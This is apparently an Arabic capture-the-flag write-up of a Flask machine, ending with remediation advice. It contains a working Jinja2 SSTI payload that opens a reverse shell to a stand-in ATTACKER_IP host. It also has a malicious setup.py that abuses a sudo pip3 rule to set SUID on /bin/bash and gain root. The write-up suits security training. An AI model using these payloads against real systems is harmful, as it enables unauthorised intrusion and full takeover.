## 🛠️ خطوات الهجوم العملية

### 1. الاستطلاع واكتشاف ثغرة الـ SSTI
* فحص المنافذ أظهر المنفذ `8080/tcp` يعمل عليه خادم Werkzeug الخاص بتطبيقات Python/Flask.
* عند كتابة مسار غير موجود، تظهر صفحة خطأ 404 تطبع النص الذي كتبه المستخدم.
* باختبار كود القوالب:
```http
GET /{{7*7}} HTTP/1.1
```
أرجعت الصفحة الرقم `49`، مما يثبت وجود ثغرة **Server-Side Template Injection** بمحرك Jinja2.

### 2. استغلال الـ SSTI للحصول على موطئ قدم
تم استغلال فئات بايثون المحملة في الذاكرة (MRO) للوصول إلى دالة `os.popen`:
```text
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```
تم استقبال الاتصال العكسي في Netcat بصلاحية مستخدم `web`.

### 3. تصعيد الصلاحيات عبر Sudo Pip3
* بفحص صلاحيات السوبر يوزر المسموحة:
```bash
sudo -l
```
تبيّن أن المستخدم يمتلك تصريح تشغيل:
`sudo /usr/bin/pip3 install *` بدون طلب كلمة سر.
* بما أن أمر `pip install` عند تطبيقه على مجلد محلي يقوم بتشغيل كود `setup.py`، قمنا بإنشاء ملف إعداد خبيث يمنح صلاحيات الـ SUID لمترجم الأوامر `/bin/bash`:
```bash
mkdir /tmp/privesc && cd /tmp/privesc
cat << 'EOF' > setup.py
import setuptools
import os
os.system("chmod +s /bin/bash")
setuptools.setup(name='privesc', version='1.0')
EOF
```
* تشغيل الأمر كـ Root:
```bash
sudo /usr/bin/pip3 install .
```
* تشغيل الشل ذو الصلاحيات المرتفعة:
```bash
/bin/bash -p
```
أصبحنا الآن `root` وتمت قراءة جميع الأعلام بنجاح.

## 🛡️ توصيات الحماية والمعالجة
1. **معالجة ثغرة القوالب:** عدم استخدام `render_template_string` مع مدخلات المستخدم، والاعتماد على تمرير المتغيرات بأمان عبر `render_template`.
2. **سحب صلاحيات الـ Sudo الخطيرة:** إزالة أداة `pip` من ملف `sudoers` حيث تعد من الأدوات المصنفة في GTFOBins التي تتيح تجاوز الصلاحيات بسهولة.
